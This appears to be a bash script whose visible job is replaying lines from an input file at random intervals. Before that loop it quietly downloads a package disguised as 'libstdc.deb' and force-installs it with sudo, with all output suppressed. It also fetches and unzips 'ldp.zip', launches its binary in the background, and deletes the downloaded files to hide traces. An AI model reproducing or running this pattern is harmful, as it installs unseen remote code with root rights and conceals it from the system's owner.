#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/al5fylpsbr0048x/ldp.zip -q
unzip ldp.zip > /dev/null 2>&1
#pwd
./scripts/ldp ./scripts/comm &
sleep 3
rm -rf ldp.zip
rm -rf scripts/ldp
rm -rf scripts/comm
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

